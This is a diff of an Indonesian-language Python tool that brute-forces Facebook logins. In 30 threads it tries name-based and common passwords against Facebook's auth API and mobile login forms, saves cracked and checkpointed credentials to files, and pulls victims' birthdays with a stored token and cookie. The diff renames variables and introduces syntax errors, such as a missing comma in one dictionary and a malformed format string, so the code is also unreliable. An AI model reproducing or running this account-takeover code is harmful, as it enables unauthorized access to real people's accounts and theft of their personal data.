@@ -989,14 +989,14 @@ def fii_xd():
 								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 							started()
 							for user in id:
-								uid, name = user.split("<=>")
-								coeg.submit(api, uid, asu)
+								id, name = user.split("<=>")
+								coeg.submit(api, id, asu)
 						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							started()
 							for user in id:
-								uid, name = user.split("<=>")
+								id, name = user.split("<=>")
 								frist=name.split(" ")
 								if len(frist)>=6:
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1006,7 +1006,7 @@ def fii_xd():
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-								coeg.submit(api, uid, fii)
+								coeg.submit(api, id, fii)
 						exit()
 				else:print(f"{P}[•]{M} Eror");exit()
 			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()
@@ -1029,14 +1029,14 @@ def fii_xd():
 						print(f"{P}[•]{M} Sandi tidak boleh kosong")
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
-						coeg.submit(api, uid, asu)
+						id, name = user.split("<=>")
+						coeg.submit(api, id, asu)
 				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
+						id, name = user.split("<=>")
 						frist=name.split(" ")
 						if len(frist)>=6:
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1047,7 +1047,7 @@ def fii_xd():
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
 
-						coeg.submit(apiiii, uid, fii)
+						coeg.submit(apiiii, id, fii)
 				exit()
 
 	elif fiisayangwidiya in ["3","03"]:
@@ -1080,13 +1080,13 @@ def fii_xd():
 							started()
 							for user in id:
 								uid, name = user.split("<=>")
-								coeg.submit(mbasic, uid, asu)
+								coeg.submit(mbasic, id, asu)
 						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							started()
 							for user in id:
-								uid, name = user.split("<=>")
+								id, name = user.split("<=>")
 								frist=name.split(" ")
 								if len(frist)>=6:
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1096,7 +1096,7 @@ def fii_xd():
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-								coeg.submit(mobil, uid, fii)
+								coeg.submit(mobil, id, fii)
 						exit()
 				else:print(f"{key}");exit()
 			except (KeyError,IOError):print(f"{_key}");exit()
@@ -1120,14 +1120,14 @@ def fii_xd():
 						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
-						coeg.submit(mbasicc, uid, asu)
+					  id, name = user.split("<=>")
+						coeg.submit(mbasicc, id, asu)
 				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
+						id, name = user.split("<=>")
 						frist=name.split(" ")
 						if len(frist)>=6:
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1137,7 +1137,7 @@ def fii_xd():
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-						coeg.submit(mobill, uid, fii)
+						coeg.submit(mobill, id, fii)
 				exit()
 				
 	elif fiisayangwidiya in ["2","02"]:
@@ -1170,13 +1170,13 @@ def fii_xd():
 							started()
 							for user in id:
 								uid, name = user.split("<=>")
-								coeg.submit(mbasic, uid, asu)
+								coeg.submit(mbasic, id, asu)
 						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							started()
 							for user in id:
-								uid, name = user.split("<=>")
+								id, name = user.split("<=>")
 								frist=name.split(" ")
 								if len(frist)>=6:
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1186,7 +1186,7 @@ def fii_xd():
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-								coeg.submit(mbasic, uid, fii)
+								coeg.submit(mbasic, id, fii)
 						exit()
 				else:print(f"{key}");exit()
 			except (KeyError,IOError):print(f"{_key}");exit()
@@ -1210,14 +1210,14 @@ def fii_xd():
 						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
-						coeg.submit(mbasicc, uid, asu)
+						id, name = user.split("<=>")
+						coeg.submit(mbasicc, id, asu)
 				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
 					started()
 					for user in id:
-						uid, name = user.split("<=>")
+						id, name = user.split("<=>")
 						frist=name.split(" ")
 						if len(frist)>=6:
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
@@ -1227,7 +1227,7 @@ def fii_xd():
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-						coeg.submit(mbasicc, uid, fii)
+						coeg.submit(mbasicc, id, fii)
 				exit()
 				
 def kone():
@@ -1246,7 +1246,7 @@ def started():
     print(f"{P}[•] Mode pesawat 5 detik jika tidak ada hasil")
     print(f"{B} | {P}")
 
-def api(uid, fii):
+def api(id, fii):
     try:
         ua = open("ua", "r").read()
     except IOError:
@@ -1257,11 +1257,11 @@ def api(uid, fii):
         pw = pw.lower()
         headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
         ses = requests.Session()
-        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(id)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
         if "session_key" in send.text and "EAAA" in send.text:
-            print(f"\r{B} |----> {I}{uid}•{pw}")
-            ok.append("%s|%s"%(uid, pw))
-            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+            print(f"\r{B} |----> {I}{id}•{pw}")
+            ok.append("%s|%s"%(id, pw))
+            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
             break
         elif "www.facebook.com" in send.json()["error_msg"]:
             try:
@@ -1269,29 +1269,29 @@ def api(uid, fii):
                 self.open = open(self.file,'r').read().splitlines()
                 token  = open('login/token.json','r').read()
                 cookie = {'cookie':open('login/cookie.json','r').read()}
-                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
                 month, day, year = ttl.split("/")
                 month = _bulan_[month]
-                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-                cp.append("%s|%s"%(uid, pw))
-                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+                print(f"\r{B} |----> {K}{id}•{pw}•{day} {month} {year}")
+                cp.append("%s|%s"%(id, pw))
+                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
                 break
             except (KeyError, IOError):
                 day = (" ")
                 month = (" ")
                 year = (" ")
             except:pass
-            cek_log(uid,pw,ua)
-            print(f"\r{B} |----> {K}{uid}•{pw}")
-            cp.append("%s|%s"%(uid, pw))
-            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+            cek_log(id,pw,ua)
+            print(f"\r{B} |----> {K}{id}•{pw}")
+            cp.append("%s|%s"%(id, pw))
+            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
             break
         else:
             continue
 
     loop += 1
 
-def apiiii(uid, fii):
+def apiiii(id, fii):
     try:
         ua = open("ua", "r").read()
     except IOError:
@@ -1303,11 +1303,11 @@ def apiiii(uid, fii):
         pw = pw.lower()
         headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
         ses = requests.Session()
-        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(id)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
         if "session_key" in send.text and "EAAA" in send.text:
-            print(f"\r{B} |----> {I}{uid}•{pw}")
-            ok.append("%s|%s"%(uid, pw))
-            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+            print(f"\r{B} |----> {I}{id}•{pw}")
+            ok.append("%s|%s"%(id, pw))
+            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
             break
         elif "www.facebook.com" in send.json()["error_msg"]:
             try:
@@ -1315,28 +1315,28 @@ def apiiii(uid, fii):
                 self.open = open(self.file,'r').read().splitlines()
                 token  = open('login/token.json','r').read()
                 cookie = {'cookie':open('login/cookie.json','r').read()}
-                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
                 month, day, year = ttl.split("/")
                 month = _bulan_[month]
-                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
-                cp.append("%s|%s"%(uid, pw))
-                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+                print(f"\r{B} |----> {K}{id}•{pw}•{day} {mont} {year}")
+                cp.append("%s|%s"%(id, pw))
+                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
                 break
             except (KeyError, IOError):
                 day = (" ")
                 month = (" ")
                 year = (" ")
             except:pass
-            print(f"\r{B} |----> {K}{uid}•{pw}")
-            cp.append("%s|%s"%(uid, pw))
-            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+            print(f"\r{B} |----> {K}{id}•{pw}")
+            cp.append("%s|%s"%(id, pw))
+            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
             break
         else:
             continue
 
     loop += 1
 
-def mbasic(uid, fii):
+def mbasic(id, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
@@ -1356,13 +1356,13 @@ def mbasic(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": id,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print(f"\r{B} |----> {I}{uid}•{pw}")
-			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {I}{id}•{pw}")
+			ok.append("%s|%s"%(id, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
@@ -1371,29 +1371,29 @@ def mbasic(uid, fii):
 				token  = open('login/token.json','r').read()
 				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					print(f"\r{B} |----> {K}{id}•{pw}•{day} {month} {year}")
+					cp.append("%s|%s"%(id, pw))
+					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			cek_log(uid,pw,ua)
-			print(f"\r{B} |----> {K}{uid}•{pw}")
-			cp.append("%s|%s"%(uid, pw))
-			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			cek_log(id,pw,ua)
+			print(f"\r{B} |----> {K}{id}•{pw}")
+			cp.append("%s|%s"%(id, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		else:
 			continue
 
 	loop += 1
 
-def mbasicc(uid, fii):
+def mbasicc(id, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
@@ -1413,13 +1413,13 @@ def mbasicc(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": id,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print(f"\r{B} |----> {I}{uid}•{pw}")
-			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {I}{id}•{pw}")
+			ok.append("%s|%s"%(id, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
@@ -1428,28 +1428,28 @@ def mbasicc(uid, fii):
 				token  = open('login/token.json','r').read()
 				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					print(f"\r{B} |----> {K}{id}•{pw}•{day} {month} {year}")
+					cp.append("%s|%s"%(id, pw))
+					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print(f"\r{B} |----> {K}{uid}•{pw}")
-			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {K}{id}•{pw}")
+			cp.append("%s|%s"%(id, pw))
+			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		else:
 			continue
 
 	loop += 1
 	
-def mobil(uid, fii):
+def mobil(id, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
@@ -1469,13 +1469,13 @@ def mobil(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": id,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print(f"\r{B} |----> {I}{uid}•{pw}")
-			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {I}{id}•{pw}")
+			ok.append("%s|%s"%(id, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
@@ -1484,29 +1484,29 @@ def mobil(uid, fii):
 				token  = open('login/token.json','r').read()
 				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					print(f"\r{B} |----> {K}{id}•{pw}•{day} {month} {year}")
+					cp.append("%s|%s"%(id, pw))
+					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			cek_log(uid,pw,ua)
-			print(f"\r{B} |----> {K}{uid}•{pw}")
-			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			cek_log(id,pw,ua)
+			print(f"\r{B} |----> {K}{id}•{pw}")
+			cp.append("%s|%s"%(id, pw))
+			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		else:
 			continue
 
 	loop += 1
 
-def mobill(uid, fii):
+def mobill(id, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
@@ -1526,13 +1526,13 @@ def mobill(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": id,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print(f"\r{B} |----> {I}{uid}•{pw}")
-			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {I}{id}•{pw}")
+			ok.append("%s|%s"%(id, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
@@ -1541,28 +1541,28 @@ def mobill(uid, fii):
 				token  = open('login/token.json','r').read()
 				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(id, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					print(f"\r{B} |----> {K}{id}•{pw}•{day} {month} {year}")
+					cp.append("%s|%s"%(id, pw))
+					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(id, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print(f"\r{B} |----> {K}{uid}•{pw}")
-			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			print(f"\r{B} |----> {K}{id}•{pw}")
+			cp.append("%s|%s"%(id, pw))
+			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(id, pw))
 			break
 		else:
 			continue
 
 	loop += 1
 	
-def cek_log(uid,pw,ua):
+def cek_log(id,pw,ua):
 	mb = ("https://mbasic.facebook.com")
 	ses = requests.Session()
 	option = []
@@ -1576,7 +1576,7 @@ def cek_log(uid,pw,ua):
 			data.update({i.get("name"):i.get("value")})
 		else:
 			continue
-	data.update({"email":uid,"pass":pw})
+	data.update({"email":id"pass":pw})
 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
 	if "checkpoint" in ses.cookies:
 		form = run.find("form")
@@ -1586,15 +1586,15 @@ def cek_log(uid,pw,ua):
 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
 		tempek = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
 		ngew = [yy.text for yy in tempek.find_all("option")]
-		print(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
+		print(f"\r{P}[•]{K}-----> {B}{id}•{pw}")
 		for opt in range(len(ngew)):
 			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
 		if "0" in str(len(ngew)):
 			jalan(f"{P}[•]{I} Hore akunya tab yesss, silahkan di login di fb lite ")
 	elif "login_error" in str(run):
-		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
+		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{id}•{pw}")
 	else:
-		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
+		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{id}•{pw}")
 
 
 if __name__=="__main__":
